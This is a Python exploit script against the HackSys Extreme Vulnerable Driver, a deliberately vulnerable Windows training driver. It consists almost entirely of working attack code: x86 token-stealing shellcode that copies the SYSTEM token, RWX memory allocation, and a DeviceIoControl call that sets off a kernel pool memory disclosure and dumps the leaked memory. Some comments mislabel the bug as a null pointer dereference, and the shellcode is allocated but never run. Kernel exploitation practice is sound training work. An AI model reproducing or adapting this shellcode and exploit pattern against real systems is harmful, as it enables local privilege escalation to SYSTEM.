# -*- coding: utf-8 -*-
# This code actually works for - HEVD_IOCTL_MEMORY_DISCLOSURE_NON_PAGED_POOL_NX IOCTL(0x813)
import sys
import random
import binascii
import struct
import os
import subprocess
import ctypes 
import json 

from ctypes import *
from ctypes.wintypes import *

kernel32 = windll.kernel32
ntdll = windll.ntdll
psapi = windll.psapi
advapi32 = windll.advapi32

def debug_print(message):
    """ debug_debug_prints message in terminal and debugger """

    print(message)
    return kernel32.OutputDebugStringA(message + "\n")


def getLastError():
    """ Format GetLastError """
    
    buf = create_string_buffer(2048)
    if kernel32.FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL,
            kernel32.GetLastError(), 0,
            buf, sizeof(buf), NULL):
        debug_print("\n[-] ERR:  " + str(buf.value))
    else:
        debug_print("Unknown Error")


def hexdump(ptr, num):
    """
    Hexdump memory region - DEBUG
    0000 | 7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00  | .ELF............
    0010 | 03 00 3e 00 01 00 00 00 10 42 0d 00 00 00 00 00  | ..>......B......
    0020 | 40 00 00 00 00 00 00 00 38 4c 39 00 00 00 00 00  | @.......8.9.....
    0030 | 00 00 00 00 40 00 38 00 09 00 40 00 1e 00 1d 00  | ....@.8...@.....
    0040 | 06 00 00 00 05 00 00 00 40 00 00 00 00 00 00 00  | ........@.......
    0050 | 40 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00  | @.......@.......
    0060 | 08 01 00 00 00 00 00 00 08 01 00 00 00 00 00 00  | ................
    0070 | 08 00 00 00 00 00 00 00 03 00 00 00 04 00 00 00  | ................
    """

    s = ''
    n = 0
    lines = []
    data = list((num * ctypes.c_byte).from_address(ptr))

    if len(data) == 0:
        return '<empty>'

    for i in range(0, num, 16):
        line = ''
        line += '%04x | ' % (i)
        n += 16

        for j in range(n-16, n):
            if j >= len(data): break
            line += '%02x ' % abs(data[j])

        line += ' ' * (3 * 16 + 7 - len(line)) + ' | '

        for j in range(n-16, n):
            if j >= len(data): break
            c = data[j] if not (data[j] < 0x20 or data[j] > 0x7e) else '.'
            line += '%c' % c

        lines.append(line)

    return '\n'.join(lines)
    

def _ret_shellcode_buffer():
    """ Payload memory allocation in user-land """

    shellcode = bytearray(
        #---[Debug]
        #"\xCC"
        #---[Setup]
        "\x60"                          # pushad
        "\x64\xA1\x24\x01\x00\x00" 	    # mov eax, fs:[KTHREAD_OFFSET]
        "\x8B\x40\x50"                  # mov eax, [eax + EPROCESS_OFFSET]
        "\x89\xC1"                      # mov ecx, eax (Current _EPROCESS structure)
        "\x8B\x98\xF8\x00\x00\x00" 	    # mov ebx, [eax + TOKEN_OFFSET]
        #---[Copy System PID token]
        "\xBA\x04\x00\x00\x00"          # mov edx, 4 (SYSTEM PID)
        "\x8B\x80\xB8\x00\x00\x00"      # mov eax, [eax + FLINK_OFFSET] <-|
        "\x2D\xB8\x00\x00\x00"          # sub eax, FLINK_OFFSET           |
        "\x39\x90\xB4\x00\x00\x00"      # cmp [eax + PID_OFFSET], edx     |
        "\x75\xED"                      # jnz                           ->|
        "\x8B\x90\xF8\x00\x00\x00"      # mov edx, [eax + TOKEN_OFFSET]
        "\x89\x91\xF8\x00\x00\x00"      # mov [ecx + TOKEN_OFFSET], edx
        #---[Recover]
        "\x61"                          # popad
        "\xC2\x10\x00"                  # ret 10
    )

    MEM_COMMIT_MEM_RESERVE = 0x3000
    PAGE_EXECUTE_READWRITE = 0x40
	
    ptr = kernel32.VirtualAlloc(
        c_int(0),                       # lpAddress
        c_int(len(shellcode)),          # dwSize
        c_int(MEM_COMMIT_MEM_RESERVE),  # flAllocationType
        c_int(PAGE_EXECUTE_READWRITE)   # flProtect
    )
    
    shellcode_ptr = (c_char * len(shellcode)).from_buffer(shellcode)

    kernel32.RtlMoveMemory(
        c_int(ptr),
        shellcode_ptr,
        c_int(len(shellcode))
    )
        
    return ptr, len(shellcode)


def _send_payload(payload_ptr, payload_len, code):
    """ Interacting with the driver """
    
    FILE_DEVICE_UNKNOWN = 0x22
    FILE_ANY_ACCESS = 0
    METHOD_NEITHER = 3

    # Recreate CTL_CODE macro to generate driver IOCTL 
    """
    ctl_code = hex(
        (FILE_DEVICE_UNKNOWN << 16) |
        (FILE_ANY_ACCESS << 14) | 
        (code << 2) | 
        METHOD_NEITHER
    )
    """

    ctl_code = code # direct_input

    # Create handle to driver """
    handle = kernel32.CreateFileA(
        "\\\\.\\HackSysExtremeVulnerableDriver", # lpFileName
        0xC0000000,              # dwDesiredAccess
        0,                       # dwShareMode
        None,                    # lpSecurityAttributes
        0x3,                     # dwCreationDisposition
        0,                       # dwFlagsAndAttributes
        None                     # hTemplateFile
    )

    IO_CTL = kernel32.DeviceIoControl(
        handle,             # hDevice
        ctl_code,           # dwIoControlCode
        None,               # lpInBuffer
        None,               # nInBufferSize
        payload_ptr,        # lpOutBuffer
        c_int(payload_len), # nOutBufferSize
        byref(c_ulong()),   # lpBytesReturned
        None                # lpOverlapped
    )
    
    return kernel32.CloseHandle(handle)


def _exploit(code):
    """ Execute exploit in order to get nt-authority/SYSTEM shell """
    shellcode_ptr, shellcode_len = _ret_shellcode_buffer() # shellcode virtual allocation

    debug_print("\n[*] User-land shellcode allocated at: [0x%x]\n" % shellcode_ptr)
    debug_print(hexdump(shellcode_ptr, 32))
    
    payload = "\x42" * 0x1f8
    payload_ptr = id(payload) + 0x14
    payload_len = len(payload) + 0x100 # read 100 bytes (Trigger Memory Disclosure Vulnerability)

    debug_print("[*] Payload PTR: [0x%x]" % payload_ptr)
    debug_print("[*] Payload Length: [%d]" % payload_len)

    debug_print("\n[+] Driver connection initilized!\n")
    raw_input("[*] Press any key to send payload...")

    # send custom payload
    _send_payload(
        payload_ptr,
        payload_len,
        code
    )

    debug_print("[+] Exploit Payload Sent!")
    debug_print("[*] Triggering Memory Disclosure!")
    debug_print(hexdump(payload_ptr, payload_len)) # Memory Disclosure Vulnerability

if __name__ == "__main__":
    """
        IOCTL to trigger NullPointerDereference in win7 x86
            https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Driver/HEVD/Windows/MemoryDisclosureNonPagedPool.c        Usefull WinDBG commands:
            .sympath c:\symbols;c:\hevd
            .reload /f *.*
            ed nt!Kd_Default_Mask 8
            .load pykd
            .load grep
            lm m HEVD
            g
    """
    code = 0x22203f # Memory Disclosure NON-PAGED POOL
    _exploit(code)
